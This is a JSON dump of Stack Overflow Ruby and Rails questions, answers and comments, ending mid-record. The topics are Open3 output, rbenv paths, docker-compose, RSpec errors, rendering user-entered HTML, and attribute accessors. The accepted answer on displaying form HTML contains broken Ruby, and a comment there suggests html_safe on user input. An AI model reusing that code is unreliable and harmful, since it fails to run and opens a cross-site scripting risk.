"https://stackoverflow.com/questions/56204309/how-to-remove-control-characters-in-ruby", "title": "How to remove control characters in ruby", "body": "<p>I used Open3 to get result of a command like this:</p>\n\n<pre><code>Open3.popen3(service_command) do |stdin, stdout, stderr|\n    result = stdout.read.delete(' ').split(\"\\n\")\nend\n</code></pre>\n\n<p>In the string returned in <code>stdout.read</code> I found there are control characters like <code>\\e[2K</code>, how can I remove those and get \"clean\" strings?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "bundler", "rbenv"], "owner": {"reputation": 1875, "user_id": 341980, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/0ce4db5e1083663c575158643313852c?s=128&d=identicon&r=PG", "display_name": "pedz", "link": "https://stackoverflow.com/users/341980/pedz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 88, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558215617, "creation_date": 1558215617, "question_id": 56203049, "link": "https://stackoverflow.com/questions/56203049/how-should-i-set-path-when-using-rbenv-with-bundler-and-rails", "title": "How should I set PATH when using rbenv with bundler and rails", "body": "<p>I'm venturing back into Ruby and Rails and giving rbenv a try at the same time.  I'm on a Mac (10.14) if that matters.  I'm using</p>\n\n<ul>\n<li>Bundler version 2.0.1</li>\n<li>Rails 6.0.0.rc1</li>\n<li>ruby 2.6.3p62 (2019-04-16 revision 67580) [x86_64-darwin18]</li>\n<li>rbenv 1.1.2</li>\n</ul>\n\n<p>My <code>~/.bundle/config</code> file has:</p>\n\n<pre><code> ----\n BUNDLE_PATH: \".bundle/gems\"\n BUNDLE_BIN: \".bundle/bin\"\n BUNDLE_DISABLE_SHARED_GEMS: \"true\"\n BUNDLE_CACHE_PATH: \"/Users/xxx/.bundle/cache\"\n BUNDLE_CACHE_ALL: \"true\"\n</code></pre>\n\n<p>I do a simple <code>rails init foo</code> followed by <code>cd foo</code> and I find that I have three bin directories of interest:</p>\n\n<ul>\n<li>.bundle/bin</li>\n<li>.bundle/gems/bin</li>\n<li>bin</li>\n</ul>\n\n<p>My normal path has <code>/Users/xxx/.rbenv/shims</code> at the front.  If I do <code>type rake</code> or <code>type rails</code> I get the one in the shims directory such as <code>/Users/xxx/.rbenv/shims/rake</code></p>\n\n<p>My question is: should I put one of the three bin directories listed above into my PATH and if so, which ones and which order?</p>\n\n<p>My belief is that the correct thing to do is to add the full path to the <code>.bundle/bin</code> directory followed by the full path to the <code>bin</code> directory followed by my usual PATH.  Is that correct?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "docker", "docker-compose", "digital-ocean"], "answers": [{"comments": [{"owner": {"reputation": 5144, "user_id": 5411461, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/RyJfN.jpg?s=128&g=1", "display_name": "Haseeb Ahmad", "link": "https://stackoverflow.com/users/5411461/haseeb-ahmad"}, "edited": false, "score": 0, "creation_date": 1558218435, "post_id": 56203002, "comment_id": 99029095, "body": "i mean when I do sudo docker-compose up -d it should run my app at public ip address... instead of it runs on 127.0.01"}, {"owner": {"reputation": 167, "user_id": 11456509, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7e14c326dc50a205b833182dc160cac?s=128&d=identicon&r=PG", "display_name": "0x76", "link": "https://stackoverflow.com/users/11456509/0x76"}, "reply_to_user": {"reputation": 5144, "user_id": 5411461, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/RyJfN.jpg?s=128&g=1", "display_name": "Haseeb Ahmad", "link": "https://stackoverflow.com/users/5411461/haseeb-ahmad"}, "edited": false, "score": 0, "creation_date": 1558218708, "post_id": 56203002, "comment_id": 99029139, "body": "That&#39;s likely not due to docker, are you using a firewall? If so did you add the port you want forwarded to its configuration?"}], "tags": [], "owner": {"reputation": 167, "user_id": 11456509, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7e14c326dc50a205b833182dc160cac?s=128&d=identicon&r=PG", "display_name": "0x76", "link": "https://stackoverflow.com/users/11456509/0x76"}, "is_accepted": false, "score": 2, "last_activity_date": 1558215110, "creation_date": 1558215110, "answer_id": 56203002, "question_id": 56202974, "link": "https://stackoverflow.com/questions/56202974/how-to-run-docker-compose-up-for-production-environment/56203002#56203002", "title": "How to run docker compose up for production environment", "body": "<p>What exactly do you mean by \"it not runs on production\"?</p>\n\n<p>If you just want to keep it running even after closing your terminal you would need to run it with the <code>-d</code> option like so:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>sudo docker-compose up -d\n</code></pre>\n\n<p>If that is not what you are asking for please clarify.</p>\n\n<p>The <a href=\"https://docs.docker.com/compose/overview/\" rel=\"nofollow noreferrer\">docker-compose docs</a> may also be helpful.</p>\n"}], "owner": {"reputation": 5144, "user_id": 5411461, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/RyJfN.jpg?s=128&g=1", "display_name": "Haseeb Ahmad", "link": "https://stackoverflow.com/users/5411461/haseeb-ahmad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558215110, "creation_date": 1558214813, "question_id": 56202974, "link": "https://stackoverflow.com/questions/56202974/how-to-run-docker-compose-up-for-production-environment", "title": "How to run docker compose up for production environment", "body": "<p>Using docker repository to install rails app on digitalocean Ubuntu 18.</p>\n\n<p>I have using that app official <a href=\"https://github.com/FarmBot/Farmbot-Web-App/blob/master/ubuntu_example.sh\" rel=\"nofollow noreferrer\">How to install FarmBot Web API on a Fresh Ubuntu 18.10 Machine\n</a></p>\n\n<p>I have done all setup .env file, gems installation, db creation, migrations , assets precompile also.</p>\n\n<p>Issue I face is that as per documentation to run app that is the command</p>\n\n<pre><code>sudo docker-compose up\n</code></pre>\n\n<p>but it not runs on production. How I can run in on production that when I hit ip address app runs</p>\n"}, {"tags": ["ruby", "rspec"], "comments": [{"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 1, "creation_date": 1558214994, "post_id": 56202902, "comment_id": 99028473, "body": "Please edit to elaborate, &quot;I have tried the following&quot;. What&#39;s the problem? Was an exception raised? If so, what was the error message and on what line did it occur?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 4, "creation_date": 1558223868, "post_id": 56202902, "comment_id": 99029718, "body": "Testing that a class method doesn&#39;t work on an object is a very unusual test to have. You shouldn&#39;t test methods that don&#39;t exist because they don&#39;t exist and don&#39;t need tests. The exception to this is if they <i>should</i> exist and you want the test to fail as a reminder."}, {"owner": {"reputation": 3, "user_id": 5007092, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ZMGVq72CMVs/AAAAAAAAAAI/AAAAAAAAax8/RlvigicbNEY/photo.jpg?sz=128", "display_name": "Faraz Noor", "link": "https://stackoverflow.com/users/5007092/faraz-noor"}, "reply_to_user": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558241441, "post_id": 56202902, "comment_id": 99031664, "body": "@CarySwoveland pleaase refer the error Invoice#convert_to_pdf should not work on object      Failure/Error: (described_class.new.convert_to_pdf).should raise_error            NoMethodError:        undefined method `convert_to_pdf&#39; for #&lt;Invoice:0x007fa48e2b2ac0&gt;"}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558244877, "post_id": 56202902, "comment_id": 99032103, "body": "That information is central to your question so it should be part of the question, not in a comment. Please edit. Don\u2019t forget to say which line of code raised the exception."}, {"owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "edited": false, "score": 0, "creation_date": 1558458735, "post_id": 56202902, "comment_id": 99105297, "body": "Don&#39;t forget to select the answer that you found most helpful, unless none of them were helpful to you."}], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 5007092, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ZMGVq72CMVs/AAAAAAAAAAI/AAAAAAAAax8/RlvigicbNEY/photo.jpg?sz=128", "display_name": "Faraz Noor", "link": "https://stackoverflow.com/users/5007092/faraz-noor"}, "edited": false, "score": 1, "creation_date": 1558241593, "post_id": 56203761, "comment_id": 99031689, "body": "Thanks @tadman It worked and I learned something new :) cheers mate!"}], "tags": [], "owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "is_accepted": true, "score": 7, "last_activity_date": 1558224030, "creation_date": 1558224030, "answer_id": 56203761, "question_id": 56202902, "link": "https://stackoverflow.com/questions/56202902/i-am-learning-rspec-and-i-have-written-a-spec-but-it-fails-partially/56203761#56203761", "title": "I am learning rspec and I have written a spec but it fails partially", "body": "<p>It's subtle but there's two ways of defining an <code>expect</code> definition. The first is where you supply <em>a value</em> or <em>expression</em>:</p>\n\n<pre><code>expect(x).to be_something\n</code></pre>\n\n<p>Here the expression is evaluated <em>immediately</em> and only then does <code>expect</code> get a chance to do its thing.</p>\n\n<p>In effect your code looks like:</p>\n\n<pre><code>x = described_class.new.convert_to_pdf # Exception happens here\nexpect(x).to raise_error # Too late, already popped an exception\n</code></pre>\n\n<p>The second form is where you supply <em>a block</em>:</p>\n\n<pre><code>expect { x }.to raise_error\n</code></pre>\n\n<p>Where here the block is <em>evaluated by <code>expect</code> itself</em> and its able to capture and inspect any errors that are generated.</p>\n\n<p>When using <code>raise_error</code> you want the block form or the exception will slip past <code>expect</code>'s rescue mechanism.</p>\n"}, {"tags": [], "owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "is_accepted": false, "score": 0, "last_activity_date": 1558356371, "creation_date": 1558356371, "answer_id": 56221320, "question_id": 56202902, "link": "https://stackoverflow.com/questions/56202902/i-am-learning-rspec-and-i-have-written-a-spec-but-it-fails-partially/56221320#56221320", "title": "I am learning rspec and I have written a spec but it fails partially", "body": "<p>You can make use of <a href=\"https://relishapp.com/rspec/rspec-expectations/docs/built-in-matchers/respond-to-matcher\" rel=\"nofollow noreferrer\"><code>respond_to</code></a> to test if the method is defined on class and/or instance:</p>\n\n<pre><code>RSpec.describe Invoice do\n  describe '#convert_to_pdf' do\n    it \"should work on class\" do \n      expect(described_class).to respond_to(:convert_to_pdf)\n    end\n\n    it \"should not work on instance\" do \n      expect(described_class.new).to_not respond_to(:convert_to_pdf)\n    end\n  end\nend\n</code></pre>\n\n<p>This way:</p>\n\n<ul>\n<li>No error will be raised</li>\n<li>Both the tests will pass, and</li>\n<li>You can explain where the method is defined.</li>\n</ul>\n\n<p><strong>Note:</strong> It doesn't test the return value of the method.</p>\n\n<p>Hope it helps.</p>\n"}], "owner": {"reputation": 3, "user_id": 5007092, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-ZMGVq72CMVs/AAAAAAAAAAI/AAAAAAAAax8/RlvigicbNEY/photo.jpg?sz=128", "display_name": "Faraz Noor", "link": "https://stackoverflow.com/users/5007092/faraz-noor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 45, "favorite_count": 0, "accepted_answer_id": 56203761, "answer_count": 2, "score": 0, "last_activity_date": 1558356371, "creation_date": 1558214018, "last_edit_date": 1558257560, "question_id": 56202902, "link": "https://stackoverflow.com/questions/56202902/i-am-learning-rspec-and-i-have-written-a-spec-but-it-fails-partially", "title": "I am learning rspec and I have written a spec but it fails partially", "body": "<p>I want a way to check if a method raises an error</p>\n\n<p>I have tried the following:</p>\n\n<pre><code>expect(described_class.new.convert_to_pdf).to raise_error\n\nclass Invoice\n    def self.convert_to_pdf\n        \"Yay\"\n    end\nend\n\nRSpec.describe Invoice do\n    describe '#convert_to_pdf' do\n        it \"Should work\" do \n            expect(described_class.convert_to_pdf).to eql(\"Yay\")\n        end\n\n        it \"should not work on object\" do \n            expect(described_class.new.convert_to_pdf).to raise_error\n        end\n    end\nend\n</code></pre>\n\n<p>I want both the test to pass as I want to explain this to my colleague how class method and instance methods differ</p>\n\n<p>Please refer my Error:</p>\n\n<p>1) Invoice#convert_to_pdf should not work on object\n     Failure/Error: (described_class.new.convert_to_pdf).should raise_error</p>\n\n<pre><code> NoMethodError:\n   undefined method `convert_to_pdf' for #&lt;Invoice:0x007fa48e2b2ac0&gt;\n # ./methods.rb:91:in `block (3 levels) in &lt;top (required)&gt;'\n</code></pre>\n"}, {"tags": ["html", "ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 3902, "user_id": 10608621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59df09a85d05117c63706f66811b70c?s=128&d=identicon&r=PG", "display_name": "mechnicov", "link": "https://stackoverflow.com/users/10608621/mechnicov"}, "edited": false, "score": 1, "creation_date": 1558210671, "post_id": 56202388, "comment_id": 99027625, "body": "Did you try something like <code>model.code.html_safe</code> in your view?"}, {"owner": {"reputation": 61, "user_id": 10907919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88155f054f72de69ebe5aaf855a660de?s=128&d=identicon&r=PG&f=1", "display_name": "M.DeBaecke", "link": "https://stackoverflow.com/users/10907919/m-debaecke"}, "reply_to_user": {"reputation": 3902, "user_id": 10608621, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d59df09a85d05117c63706f66811b70c?s=128&d=identicon&r=PG", "display_name": "mechnicov", "link": "https://stackoverflow.com/users/10608621/mechnicov"}, "edited": false, "score": 0, "creation_date": 1558210718, "post_id": 56202388, "comment_id": 99027639, "body": "No, where should I put it in my view than?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1558231331, "post_id": 56202388, "comment_id": 99030526, "body": "What do you mean &quot;code in a form field&quot;? Do you want that to show up inside a <code>&lt;textarea&gt;</code>?"}, {"owner": {"reputation": 2487, "user_id": 267693, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7kQYV.jpg?s=128&g=1", "display_name": "Ken Ratanachai S.", "link": "https://stackoverflow.com/users/267693/ken-ratanachai-s"}, "edited": false, "score": 0, "creation_date": 1558236780, "post_id": 56202388, "comment_id": 99031112, "body": "what is in food.image? file path?"}, {"owner": {"reputation": 61, "user_id": 10907919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88155f054f72de69ebe5aaf855a660de?s=128&d=identicon&r=PG&f=1", "display_name": "M.DeBaecke", "link": "https://stackoverflow.com/users/10907919/m-debaecke"}, "edited": false, "score": 0, "creation_date": 1558246757, "post_id": 56202388, "comment_id": 99032425, "body": "What I mean by in a form field is that I can put the code on the website itself in a form field. food.image contains the content from that field. En makes it able to display on the right page."}], "answers": [{"tags": [], "owner": {"reputation": 7811, "user_id": 379779, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/4c3bd8d869b7e1caa45485b0b3e126a4?s=128&d=identicon&r=PG", "display_name": "zawhtut", "link": "https://stackoverflow.com/users/379779/zawhtut"}, "is_accepted": true, "score": 0, "last_activity_date": 1558335830, "creation_date": 1558335830, "answer_id": 56215793, "question_id": 56202388, "link": "https://stackoverflow.com/questions/56202388/how-to-display-html-code-trough-a-ruby-form/56215793#56215793", "title": "How to display html code trough a ruby form", "body": "<pre><code>def image_tag_and_link_tag(source, options = {})\n  options = options.symbolize_keys\n  check_for_image_tag_errors(options)\n  skip_pipeline = options.delete(:skip_pipeline)\n\n  options[:src] = resolve_image_source(source, skip_pipeline)\n\n  href_options = {}\n  href_options[:href] = option[:src]\n  href_options[:target] = '_blank'\n  href_options[:rel] = \"nofollow noreferrer\"\n\n  if options[:srcset] &amp;&amp; !options[:srcset].is_a?(String)\n    options[:srcset] = options[:srcset].map do |src_path, size|\n      src_path = path_to_image(src_path, skip_pipeline: skip_pipeline)\n      \"#{src_path} #{size}\"\n    end.join(\", \")\n  end\n\n  options[:width], options[:height] = extract_dimensions(options.delete(:size)) if options[:size]\n  tag(\"img\", options),tag(\"a\",href_options)\nend\n</code></pre>\n\n<h2>Above method will return two html tags \"img\" and \"a\"</h2>\n\n<p>Reference:<a href=\"https://www.rubydoc.info/github/rails/rails/ActionView%2FHelpers%2FAssetTagHelper:image_tag\" rel=\"nofollow noreferrer\">https://www.rubydoc.info/github/rails/rails/ActionView%2FHelpers%2FAssetTagHelper:image_tag</a></p>\n"}], "owner": {"reputation": 61, "user_id": 10907919, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88155f054f72de69ebe5aaf855a660de?s=128&d=identicon&r=PG&f=1", "display_name": "M.DeBaecke", "link": "https://stackoverflow.com/users/10907919/m-debaecke"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 1, "closed_date": 1559105971, "accepted_answer_id": 56215793, "answer_count": 1, "score": 0, "last_activity_date": 1558335830, "creation_date": 1558209393, "question_id": 56202388, "link": "https://stackoverflow.com/questions/56202388/how-to-display-html-code-trough-a-ruby-form", "closed_reason": "Needs details or clarity", "title": "How to display html code trough a ruby form", "body": "<p>What I want is when I put html code that renders an image with a link in a form field that the image displays and not the code itself. I am not sure if this is even possible.</p>\n\n<p>I found a couple of gems that kinda did that but only the <p> tags and <br> tags and stuff. Never to the level of this stuff. </p>\n\n<p>How I render my form: \n    &lt;%= food.image %></p>\n\n<p>The sort of code I want to put in my form field:</p>\n\n<pre><code>&lt;a target=\"_blank\"  href=\"https://rads.stackoverflow.com/amzn/click/com/B0040QS3PO\" rel=\"nofollow noreferrer\"&gt;&lt;img border=\"0\" src=\"//ws-na.amazon-adsystem.com/widgets/q?_encoding=UTF8&amp;MarketPlace=US&amp;ASIN=B0040QS3PO&amp;ServiceVersion=20070822&amp;ID=AsinImage&amp;WS=1&amp;Format=_SL250_&amp;tag=lovelytoulous-20\" &gt;&lt;/a&gt;&lt;img src=\"//ir-na.amazon-adsystem.com/e/ir?t=lovelytoulous-20&amp;l=am2&amp;o=1&amp;a=B0040QS3PO\" width=\"1\" height=\"1\" border=\"0\" alt=\"\" style=\"border:none !important; margin:0px !important;\" /&gt;\n</code></pre>\n\n<p>Is there a gem that I can use or is there an other way of doing this?\nThanks for heling me out!</p>\n"}, {"tags": ["ruby"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 8388161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e61f6f7cae90e9f18e80ae7a09c4502d?s=128&d=identicon&r=PG&f=1", "display_name": "tronux7", "link": "https://stackoverflow.com/users/8388161/tronux7"}, "edited": false, "score": 0, "creation_date": 1558200003, "post_id": 56201224, "comment_id": 99025277, "body": "it worked! can you also briefly explain the reason why? i&#39;m new to ruby and i posted this question because i think there is no general answer around regarding this. P.S: i added an arrow up to your answer but it doesn&#39;t show the +1 because i&#39;m a new user (i suppose)"}, {"owner": {"reputation": 449, "user_id": 10739704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XmWze.jpg?s=128&g=1", "display_name": "nileshkumar", "link": "https://stackoverflow.com/users/10739704/nileshkumar"}, "reply_to_user": {"reputation": 13, "user_id": 8388161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e61f6f7cae90e9f18e80ae7a09c4502d?s=128&d=identicon&r=PG&f=1", "display_name": "tronux7", "link": "https://stackoverflow.com/users/8388161/tronux7"}, "edited": false, "score": 0, "creation_date": 1558200359, "post_id": 56201224, "comment_id": 99025368, "body": "<code>attr_accessor</code> is a Getter and Setter method in Ruby. what you wrote was wrong syntax. And the <code>puts</code> method does not need parenthesis. For more information, please refer  <code>https:&#47;&#47;apidock.com&#47;ruby&#47;Module&#47;attr_accessor</code>"}, {"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 0, "creation_date": 1558200725, "post_id": 56201224, "comment_id": 99025460, "body": "&quot;what you wrote was wrong syntax&quot; \u2013 That is wrong. If it was wrong syntax, it would terminate with a <code>SyntaxError</code> before even running."}, {"owner": {"reputation": 449, "user_id": 10739704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XmWze.jpg?s=128&g=1", "display_name": "nileshkumar", "link": "https://stackoverflow.com/users/10739704/nileshkumar"}, "reply_to_user": {"reputation": 13, "user_id": 8388161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e61f6f7cae90e9f18e80ae7a09c4502d?s=128&d=identicon&r=PG&f=1", "display_name": "tronux7", "link": "https://stackoverflow.com/users/8388161/tronux7"}, "edited": false, "score": 0, "creation_date": 1558200763, "post_id": 56201224, "comment_id": 99025465, "body": "@tronux: you&#39;re welcome.. this SO post will help you most for this ruby concept: <a href=\"https://stackoverflow.com/questions/4370960/what-is-attr-accessor-in-ruby\" title=\"what is attr accessor in ruby\">stackoverflow.com/questions/4370960/&hellip;</a>"}], "tags": [], "owner": {"reputation": 449, "user_id": 10739704, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XmWze.jpg?s=128&g=1", "display_name": "nileshkumar", "link": "https://stackoverflow.com/users/10739704/nileshkumar"}, "is_accepted": false, "score": 0, "last_activity_date": 1558199775, "creation_date": 1558199775, "answer_id": 56201224, "question_id": 56201052, "link": "https://stackoverflow.com/questions/56201052/undefined-method-my-attr-for-my-class0x000001-nomethoderror/56201224#56201224", "title": "undefined method `my_attr=&#39; for #&lt;My_class:0x000001&gt; (NoMethodError)", "body": "<p>Some modifications you need to do:</p>\n\n<p>please use <code>attr_accessor :name, :age, :gender</code> in your ruby class</p>\n\n<p>and then try:</p>\n\n<pre><code> puts person.name\n puts person.age\n puts person.gender\n</code></pre>\n\n<p>It should work for you..</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 8388161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e61f6f7cae90e9f18e80ae7a09c4502d?s=128&d=identicon&r=PG&f=1", "display_name": "tronux7", "link": "https://stackoverflow.com/users/8388161/tronux7"}, "edited": false, "score": 0, "creation_date": 1558217047, "post_id": 56201637, "comment_id": 99028841, "body": "thank you for the exaustive explanation! P.S: i ack many of the hints you wrote about object oriented design. I&#39;m just playing around with ruby"}], "tags": [], "owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "is_accepted": true, "score": 0, "last_activity_date": 1558203096, "last_edit_date": 1592644375, "creation_date": 1558203096, "answer_id": 56201637, "question_id": 56201052, "link": "https://stackoverflow.com/questions/56201052/undefined-method-my-attr-for-my-class0x000001-nomethoderror/56201637#56201637", "title": "undefined method `my_attr=&#39; for #&lt;My_class:0x000001&gt; (NoMethodError)", "body": "<p>If you look at <a href=\"http://ruby-doc.org/core/Module.html#method-i-attr\" rel=\"nofollow noreferrer\">the documentation of <code>Module#attr</code></a>, you will see that there are three &quot;overloads&quot; for using it:</p>\n<blockquote>\n<h1><code>attr(name, \u2026)</code> \u2192 <code>nil</code></h1>\n<h1><code>attr(name, true)</code> \u2192 <code>nil</code></h1>\n<h1><code>attr(name, false)</code> \u2192 <code>nil</code></h1>\n</blockquote>\n<p>The documentation then further explains the differences between the three:</p>\n<blockquote>\n<p>The first form is equivalent to <code>attr_reader</code>. The second form is equivalent to <code>attr_accessor(name)</code> but deprecated. The last form is equivalent to <code>attr_reader(name)</code> but deprecated.</p>\n</blockquote>\n<p>So, the first and third forms only generate readers, not writers. The second form generates a reader and a writer, but it only takes a single <code>name</code> formal parameter, you cannot use it to generate multiple attributes.</p>\n<p>Also, forms two and three are deprecated and all three forms are non-idiomatic.</p>\n<p>If you want to fix your code using the non-idiomatic <code>Module#attr</code>, you need to do this:</p>\n<pre><code>attr :name  , true\nattr :age   , true\nattr :gender, true\n</code></pre>\n<p>You can simplify this a little using something like</p>\n<pre><code>%i[name age gender].each do |attribute|\n  attr attribute, true\nend\n</code></pre>\n<p>However, as mentioned in the documentation, this form is deprecated, and as I mentioned earlier, <code>Module#attr</code> is non-idiomatic.</p>\n<p>The idiomatic way is to use the <code>Module#attr_*</code> family of methods, i.e. <a href=\"http://ruby-doc.org/core/Module.html#method-i-attr_reader\" rel=\"nofollow noreferrer\"><code>Module#attr_reader</code></a>, <a href=\"http://ruby-doc.org/core/Module.html#method-i-attr_writer\" rel=\"nofollow noreferrer\"><code>Module#attr_writer</code></a>, and <a href=\"http://ruby-doc.org/core/Module.html#method-i-attr_accessor\" rel=\"nofollow noreferrer\"><code>Module#attr_accessor</code></a>:</p>\n<pre><code>attr_accessor :name, :age, :gender\n</code></pre>\n<p>Note that since your <code>Person</code> class doesn't actually have any behavior, you could simply replace it with a <code>Struct</code>:</p>\n<pre><code>Person = Struct.new(:name, :age, :gender)\n</code></pre>\n<p>However, note that accessors in general and writers in particular are not good object-oriented design. Objects should <em>do</em> something, they should have <em>behavior</em>. Your <code>Person</code> objects don't have any behavior, they just contain data. Also, an object should be valid after it is created, but your <code>Person</code> objects are empty when they are created. And lastly, if at all possible, objects should be <em>immutable</em>.</p>\n<p>We can make sure that the object is valid after creation by adding an initializer:</p>\n<pre><code>class Person\n  attr_accessor :name, :age, :gender\n\n  def initialize(name, age, gender)\n    self.name, self.age, self.gender = name, age, gender\n  end\nend\n\nperson = Person.new('John', 55, 'male')\n</code></pre>\n<p>Note: <a href=\"http://ruby-doc.org/core/Struct.html\" rel=\"nofollow noreferrer\"><code>Struct</code></a> will create an initializer for us.</p>\n<p>If we want to make the object immutable, we need to remove the writers (or make them <code>private</code>). Unfortunately, <code>Struct</code> won't do that for us:</p>\n<pre><code>class Person\n  attr_reader :name, :age, :gender\n\n  private\n\n  attr_writer :name, :age, :gender\n\n  def initialize(name, age, gender)\n    self.name, self.age, self.gender = name, age, gender\n  end\nend\n\nperson = Person.new('John', 55, 'male')\n</code></pre>\n<p>Now, <code>person</code> is fully initialized after creating it, and it can no longer be changed.</p>\n"}], "owner": {"reputation": 13, "user_id": 8388161, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e61f6f7cae90e9f18e80ae7a09c4502d?s=128&d=identicon&r=PG&f=1", "display_name": "tronux7", "link": "https://stackoverflow.com/users/8388161/tronux7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 35, "favorite_count": 0, "accepted_answer_id": 56201637, "answer_count": 2, "score": 0, "last_activity_date": 1558203096, "creation_date": 1558198519, "question_id": 56201052, "link": "https://stackoverflow.com/questions/56201052/undefined-method-my-attr-for-my-class0x000001-nomethoderror", "title": "undefined method `my_attr=&#39; for #&lt;My_class:0x000001&gt; (NoMethodError)", "body": "<p>i'm creating a new Person class in a Person.rb file.\nWhen i use <code>ruby Person.rb</code> in my terminal it shows a NoMethodError:</p>\n\n<pre><code>Person.rb:12:in `&lt;main&gt;': undefined method `name=' for #&lt;Person:0x00000001abb6d8&gt; (NoMethodError)\nDid you mean?  name\n</code></pre>\n\n<p>this is the code i wrote:</p>\n\n<pre><code>class Person\n    attr :name, :age, :gender\nend\n\nperson = Person.new\n\nperson.name = \"John\"\nperson.age = 55\nperson.gender = \"male\"\n\nputs(person.name, person.age, person.gender)\n</code></pre>\n\n<p>any suggestion?</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 335867, "user_id": 2988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ed181f8c80df53d2b67a4f4fff088ed4?s=128&d=identicon&r=PG", "display_name": "J&#246;rg W Mittag", "link": "https://stackoverflow.com/users/2988/j%c3%b6rg-w-mittag"}, "edited": false, "score": 3, "creation_date": 1558189768, "post_id": 56199662, "comment_id": 99022834, "body": "Here&#39;s a question for you: does the string <code>&#39;+&#39;</code> contain the array <code>[&#39;+&#39;, &#39;-&#39;, &#39;X&#39;, &#39;&#47;&#39;]</code>?"}, {"owner": 